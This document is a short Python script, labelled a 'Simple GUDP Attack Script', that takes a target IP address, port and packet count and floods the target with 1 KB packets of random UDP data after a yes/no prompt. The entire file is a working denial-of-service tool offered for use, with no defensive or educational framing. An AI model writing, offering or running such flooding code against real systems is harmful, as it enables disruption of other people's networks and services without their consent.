import socket
import argparse
import random
import time

def generate_random_data(size):
    """Generate random data of specified size."""
    return bytearray([random.randint(0, 255) for _ in range(size)])

def send_gudp_attack(target_ip, target_port, num_packets):
    """Send GUDP packets to the target."""
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        for i in range(num_packets):
            data = generate_random_data(1024)
            udp_socket.sendto(data, (target_ip, target_port))
            print(f"Sent packet {i+1}/{num_packets}")
            time.sleep(0.001)  # Adjust sending rate if needed
    except socket.error as e:
        print(f"Error sending packet: {e}")
    finally:
        udp_socket.close()

def main():
    parser = argparse.ArgumentParser(description='Simple GUDP Attack Script')
    parser.add_argument('target_ip', help='Target IP address')
    parser.add_argument('target_port', type=int, help='Target port number')
    parser.add_argument('num_packets', type=int, help='Number of packets to send')

    args = parser.parse_args()

    print(f"Target IP: {args.target_ip}")
    print(f"Target Port: {args.target_port}")
    print(f"Number of Packets: {args.num_packets}")

    confirm = input("Proceed with the attack? (y/n): ")
    if confirm.lower() != 'y':
        print("Attack aborted.")
        return

    send_gudp_attack(args.target_ip, args.target_port, args.num_packets)

if __name__ == "__main__":
    main()
